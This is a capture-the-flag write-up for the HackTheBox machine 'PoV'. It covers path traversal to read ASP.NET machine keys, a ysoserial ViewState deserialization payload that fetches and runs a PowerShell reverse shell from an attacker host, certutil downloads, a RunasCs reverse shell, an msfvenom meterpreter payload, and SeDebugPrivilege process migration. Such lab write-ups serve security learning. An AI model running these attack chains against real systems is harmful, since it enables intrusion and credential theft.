# Machine Info

**PoV** is a medium-rated Windows machine on HackTheBox. It involves exploiting an Insecure Deserialization Vulnerability in ASP.NET 4.5 for initial foothold. For lateral movement, we need to extract the clear text password of the 'alaading' user from connection.xml file. The 'alaading' user has the **SeDebugPrivilege** enabled, which facilitates Privilege Escalation.

<img  alt="Pasted image 20240607172659" src="https://github.com/iammR0OT/HTB/assets/74102381/3a9a38b9-c555-424d-b440-fcc6d4017c44">

# User
## Scanning through Nmap

First of all, we will go with Nmap to scan the whole network and check for services running on the network. To scan the entire network and find all the open ports, I use **-p-** to scan all **65535** ports with **--min-rate 10000** to scan the network faster using **nmap**. After scanning, I retrieve a list of open ports on the network and extract only the open ports using various terminal tools like **cut**, **tr**, etc.

```bash
$ nmap -p- -Pn --min-rate 10000 10.10.11.251 -oN ini.txt && cat ini.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','
# Open ports
22,80
```

Now Let's run the depth scan on these specific ports using 

```bash
$ nmap -p22,80 -sC -sV -A -T4 -Pn 10.10.11.251 -oN scan.txt
```

- **-sC** is to run all the default scripts
- **-sV** for service and version detection
- **-A** to check all default things
- **-T4** for aggressive scan
- **-oN** to write the result into a specified file
- **-Pn** to Treat all hosts as online

```shell
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: pov.htb
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Information Gathering

From Website title we discover the domain name of web which is **pov.htb**. Let's add this we our **/etc/hosts**. 

```shell
cat /etc/hosts | grep pov
10.10.11.252   pov.htb
```
### Port 80

Web is simple static Business startup Website with some css and js code not going anywhere.

<img alt="Pasted image 20240128101929" src="https://github.com/iammR0OT/HTB/assets/74102381/b49d704b-5201-4460-bc54-f3fa389be4df">

Found potential user name **sfitz** from email.

<img  alt="Pasted image 20240128101741" src="https://github.com/iammR0OT/HTB/assets/74102381/7b051e38-afc4-4396-bb44-98cef5cfdf85">

After that i go for subdomain enumeration using tool **ffuf** (FFuf is **an open source (MIT license) fuzzing tool to detect content and elements on webservers and web applications**.), was able to discover on subdomain called **dev** let's also add this to our local **DNS** file called **/etc/hosts**. In ffuf **-w** is used for wordlist path, **-u** for **URI**, **-H** for **Header**, **-c** to colorize the output and **-fs** to filter out specific size in my case it is 12330.

```shell
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://pov.htb/  -H "Host: FUZZ.pov.htb" -c -fs 12330

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pov.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.pov.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 12330
________________________________________________

dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 233ms]
```

After visiting the website, it is a portfolio website of user **Stephen ftiz**. 

<img  alt="Pasted image 20240128103539" src="https://github.com/iammR0OT/HTB/assets/74102381/4143c02e-9a08-4caf-a742-b05115cdb4df">

**wappalyzer** shows that the backend language is **ASP.NET** and the sever **IIS 10.0** is running 
<img  alt="Pasted image 20240128103429" src="https://github.com/iammR0OT/HTB/assets/74102381/2ea46cae-e676-444c-92e2-557c0ae7495a">

In about page, there is a download CV button

<img  alt="Pasted image 20240128103840" src="https://github.com/iammR0OT/HTB/assets/74102381/88dff239-f022-4ec4-85da-910718c40b4b">

In comments section, one of it's customer said he is not good at secure coding in ASP.NET. So we are now looking for a vulnerability in ASP.NET

<img  alt="Pasted image 20240128104129" src="https://github.com/iammR0OT/HTB/assets/74102381/466115ac-5a3d-4133-affc-3978d4e5d898">

Let's Download the CV and intercept the request in burp. In request we can see that the developer use **VIEWSTATE** field to maintain the state of page.
VIEWSTATE is **one of the methods of the ASP.NET page framework used to preserve and store the page and control values between round trips**. It is maintained internally as a hidden field in the form of an encrypted value and a key.

Let's google if there is any vulnerability related to VIEWSTATE. And with a quick google search we discover that the VIEWSTATE field is vulnerable to **Insecure Deserialization** attack.

![Pasted image 20240224133834](https://github.com/iammR0OT/HTB/assets/74102381/792663e3-5912-4f10-9481-1154d37507d4)

 To exploit VIEWSTATE deserialization, we need two things
 - Validationkey
 - Decryptionkey
These both values store in **web.config** file in root directory of application. Let's try  to read the web.config file using Directory traversal attack. We successfully managed to read the content of web.config file.

![Pasted image 20240224134522](https://github.com/iammR0OT/HTB/assets/74102381/523a1176-9e4c-4e36-be56-3f033de8b756)

```http request
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 360
Origin: http://dev.pov.htb
Connection: close
Referer: http://dev.pov.htb/portfolio/
Upgrade-Insecure-Requests: 1

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=YELV8MkHqS183JS5OCwLzDf6cYORnak7lstS35EpzCoyuuQiuwhoOYpay1w0EdG4nujJ7MMOdpYKlRUeOx%2BdQYeSe9k%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=QVKOEtVHSsDQmTMYu0c91BNlt%2B8wlI11mW%2FeyY70IFOmvX2AxNHDIm76U7Hp7zuqtHg1perf7DOSgWUaSd39VmZEotqKm6XvxTwYocXEVy5Tvsv4H9%2FJPZIXSUyD8zfmGX9UCw%3D%3D&file=/web.config
```

```http response
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/octet-stream
Server: Microsoft-IIS/10.0
Content-Disposition: attachment; filename=/web.config
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Wed, 31 Jan 2024 17:36:03 GMT
Connection: close
Content-Length: 866
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
	 <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```

### Exploitation

Insecure deserialization is **a vulnerability in which untrusted or unknown data is used to inflict a denial-of-service attack, execute code, bypass authentication or otherwise abuse the logic behind an application**. Serialization is the process that converts an object to a format that can later be restored.
You can Learn more about ASP.net VIEWSTATE Deserialization attack [here](https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817) and [here](https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net).
To exploit the deserialization vulnerability we need **ysoserial** tool written by **pwntester**. You can download it from [here](https://github.com/pwntester/ysoserial.net/releases).  We have both **descryptionkey** and **validationkey**, Let's Exploit it.

We will be using **PowerShellTCP** script by **nishang** to get reverse shell. you can download PowerShellTCP from [here](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). After download it run a python server in the same directory in which you PowerShellTCP script resides using command:

```bash
$ python3 -m http.server 80
```

This will run a local http server on port 80, and run a listener in your local machine on a port which you will set in serialization payload. In my case, i used port **9001**

```bash
$ nc -lvnp 9001
```

- **-l** for listener
- **-v** for verbosity
- **-n** for numeric IP address, no DNS name.
- **-p** for port number

After that create a serialized payload through which we will be getting shell using command:

```shell 
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.16.3/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.3 -Port 9001" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```

After payload creation, copy the payload and paste it in VIEWSTATE field in burp request and send request

![Pasted image 20240224140657](https://github.com/iammR0OT/HTB/assets/74102381/a486537f-5da0-458c-8433-4ec0d76f4ab9)

And we got a shell as **sfitz** user with in a second. 

![Pasted image 20240224141134](https://github.com/iammR0OT/HTB/assets/74102381/05b2721a-f8ed-4235-8983-826947b1b57d)

## Shell as allaading user

In the Documents directory of **sfatiz** user, we found a file name **connection.xml** which include the encrypted password of user **alaading**.
**PSCredential** is a class in the .NET framework used in **PowerShell** to securely store a username and password combination. It's commonly used when working with cmdlets or functions that require credentials, such as when accessing network resources, connecting to remote servers, or running commands with different user privileges.

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```

To obtain the clear text password of alaading user, we will be using the below script:  [source](https://stackoverflow.com/questions/63639876/powershell-password-decrypt)

```powershell
echo "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6"  > hash.txt
$EncryptedString = Get-Content ./hash.txt
$SecureString = ConvertTo-SecureString $EncryptedString
$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList "username",$SecureString
echo $Credential.GetNetworkCredential().password
```

![Pasted image 20240224144352](https://github.com/iammR0OT/HTB/assets/74102381/430979ff-4ab2-4877-9298-e3b09e0cdb51)

`alaading : f8gQ8fynP44ek1m3`

Now we have credientials of **alaading** user. Let's use RunasCs.exe to gain shell as **alaading**. 
**RunasCs** is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials. This tool is an improved and open version of windows builtin **runas.exe**. Let's first move RunasCs.exe to victim machine using certutil, an windows built-in tool to manage certificates.

```
certutil.exe -urlcache -f http://10.10.14.5:8000/RunasCs.exe RunasCs.exe
```

<img  alt="Pasted image 20240607170033" src="https://github.com/iammR0OT/HTB/assets/74102381/4dee13a9-40e0-494e-86bb-f825cd67c523">

We can gain remote access using RunasCs.exe with **-r** option.

```bash
  RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.14.5:9001
```

<img alt="Pasted image 20240607170605" src="https://github.com/iammR0OT/HTB/assets/74102381/395190c2-3efa-431a-8ecb-a8ce8a3124a6">

Our User Flag is present in **Alaading** user Desktop Directory

<img width="299" alt="Pasted image 20240607170342" src="https://github.com/iammR0OT/HTB/assets/74102381/3e76db94-7047-4c0e-9c60-fa78af7f8bbb">

# Privilege Escalation

The very first command i run to check **alaading** user permission is `whoami /priv` which reveals that the **alaading** user have **SeDebugPrivilege** permission

<img alt="Pasted image 20240607170652" src="https://github.com/iammR0OT/HTB/assets/74102381/ccfb7449-e7d9-484d-8983-a35d78ebb945">

### SeDebugPrivilege

According to Microsoft official documentation  [link](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4672):    

> [!NOTE] SeDebugPrivilege
> With **SeDebugPrivilege** privilege, the user can attach a debugger to any process or to the kernel. We recommend that SeDebugPrivilege always be granted to Administrators, and only to Administrators. Developers who are debugging their own applications do not need this user right. Developers who are debugging new system components need this user right. This user right provides complete access to sensitive and critical operating system components.

So We can use this permission to gain Admin access using **process migration**. The process **winlogon** always run with the Admin privileges in windows, we can migrate to it's **PID** to gain admin access. 

Let's First get shell on Metasploit meterpreter. We will create malicious .exe file using msfvenom.
`
```bash
$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
```

Deliver malicious binary file using same method as we did before using **certutil** start listener on metasploit and run **shell.exe** file.

```bash
$ msfconsole -q
$ use exploit/multi/handler
$ set palyload windows/x64/meterpreter_reverse_tcp
$ set LHOST=tun0
$ run
```

<img alt="Pasted image 20240607171551" src="https://github.com/iammR0OT/HTB/assets/74102381/a2323f05-6f8e-4438-b94a-bdfb5ed87393">

Now list running processes and find the **PID** of **winlogin**. PID **552** is winlogon ID.

<img  alt="Pasted image 20240607171750" src="https://github.com/iammR0OT/HTB/assets/74102381/254be8ca-7de1-408f-ac17-6c679abca3be">

Let's use `migrate 552` in meterpreter to impersonate to **winlogon** process. We are **nt authority\system**

<img alt="Pasted image 20240607172052" src="https://github.com/iammR0OT/HTB/assets/74102381/81bc49fa-face-4b82-91e6-6ec35bab0ae3">

Our Root flag is present on Administrator's Desktop directory.

<img  alt="Pasted image 20240607172208" src="https://github.com/iammR0OT/HTB/assets/74102381/4791dfe6-1bda-4513-9b36-71bd7e3540a9">

# Flags

User : f642ac5862307........62e9870accd33

Root: b2fd724ef3b1eaa.......29640239be0
# Happy Hacking ❤
